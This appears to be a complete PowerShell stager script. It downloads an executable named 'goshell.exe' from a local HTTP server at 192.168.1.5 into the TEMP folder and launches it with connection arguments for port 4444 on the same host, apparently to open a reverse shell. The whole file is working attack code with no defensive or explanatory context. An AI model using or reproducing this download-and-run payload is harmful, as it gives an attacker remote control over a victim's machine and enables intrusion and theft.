$binaryUrl = "http://192.168.1.5:8000/goshell.exe"
$binaryPath = "$env:TEMP\goshell.exe"

Function Get-Binary
{
	Invoke-WebRequest "$binaryUrl" -o "$binaryPath"
}

Function Invoke-Binary
{
	Start-Process "$binaryPath" -host 192.168.1.5 -port 4444
}

Get-Binary
Invoke-Binary
